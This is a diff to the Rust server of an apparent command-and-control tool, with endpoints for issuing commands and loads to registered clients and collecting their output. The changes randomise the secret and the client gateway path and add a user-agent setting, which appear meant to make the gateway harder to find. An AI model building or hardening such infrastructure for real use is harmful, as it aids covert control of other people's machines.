@@ -15,6 +15,7 @@ extern crate colored;
 use actix_web::{
     web, App, HttpServer
 };
+use random_string::generate;
 
 use crate::libraries::miscellaneous::general::*;
 
@@ -45,7 +46,7 @@ use lazy_static::lazy_static;
 use crate::serde_json::json;
 use serde_json;
 use sha256;
-use rand;
+use rand::{self, random};
 
 
 lazy_static! {
@@ -60,6 +61,9 @@ lazy_static! {
     static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
     static ref SUSPICIOUS_IP_CHECK: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
     static ref MAX_OUTPUT_SUBMISSION_KB: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
+
+    static ref GATEWAY_PATH: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
+    static ref USERAGENT: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
 }
 
 lazy_static! {
@@ -102,7 +106,8 @@ async fn main() -> std::io::Result<()> {
         Err(_) => {
             write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                 &json!({
-                    "api_secret": "changeme",
+                    "api_secret": generate(64, CHARSET),
+                    "gateway_path": generate(16, CHARSET),
 
                     "connection_interval": 300,
                     "connection_interval_buffer": 10,
@@ -168,6 +173,9 @@ async fn main() -> std::io::Result<()> {
     *CONNECTION_INTERVAL_BUFFER.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval_buffer");
     *SUSPICIOUS_IP_CHECK.write().unwrap() = key_to_bool(&parsed_json_config, "suspicious_ip_check");
     *MAX_OUTPUT_SUBMISSION_KB.write().unwrap() = key_to_u64(&parsed_json_config, "max_output_submission_kb");
+
+    *GATEWAY_PATH.write().unwrap() = key_to_string(&parsed_json_config, "gateway_path");
+    *USERAGENT.write().unwrap() = key_to_string(&parsed_json_config, "useragent");
 
     *DISCORD_WEBHOOK_URL.write().unwrap() = key_to_string(&parsed_json_config["webhook"], "url");
     *NOTIFICATION_ON_CLIENT_REGISTRATION.write().unwrap() = key_to_bool(&parsed_json_config["webhook"], "client_registered");
@@ -264,9 +272,11 @@ async fn main() -> std::io::Result<()> {
     ").await.expect("blocks table creation failed");
 
     fprint("info", &format!(
-        "Server running! Gateway path: {}", 
-        format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
-    ));
+        "Server running! Gateway path: http://{}/{}", 
+            key_to_string(&parsed_json_config, "host"), 
+            key_to_string(&parsed_json_config, "gateway_path")
+        )
+    );
 
     discord_webhook_push(
         "💻 Server Online",
@@ -277,8 +287,7 @@ async fn main() -> std::io::Result<()> {
     
     HttpServer::new(move || {
         App::new()
-            .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb (not anymore lol)
-            .service(gateway)
+            .app_data(web::PayloadConfig::default().limit((*MAX_OUTPUT_SUBMISSION_KB.read().unwrap()) as usize * 1024)) 
             .service(api_issue_load)
             .service(api_clients_list)
             .service(api_get_output)
@@ -291,6 +300,7 @@ async fn main() -> std::io::Result<()> {
             .service(api_outputs_list)
             .service(api_parse_storage)
             .service(api_issue_command)
+            .service(gateway)
     })
     .bind(&key_to_string(&parsed_json_config, "host"))? 
     .run()
